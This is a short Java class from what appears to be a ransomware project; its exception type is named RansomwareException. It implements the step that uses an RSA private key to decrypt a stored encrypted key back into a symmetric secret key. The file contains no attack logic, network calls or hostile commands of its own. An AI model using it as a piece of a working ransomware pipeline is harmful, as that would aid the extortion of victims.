package com.security;

import lombok.SneakyThrows;

import java.security.PrivateKey;

public class DecryptKeyHandler implements Handler<PipelineData, PipelineData> {
    @Override
    @SneakyThrows
    public PipelineData process(PipelineData input) {
        if (input.getPrivateKey() == null) {
            throw new RansomwareException("Private key is null");
        }
        if (input.getEncKeyCode() == null) {
            return input;
        }
        PrivateKey privateKey = RSAGenKeyReader.loadPrivateKey(input.getPrivateKey());
        String plainKeyString = RSACipher.getInstance().decrypt(input.getEncKeyCode(), privateKey);
        input.setSecretKey(plainKeyString);
        return input;
    }
}
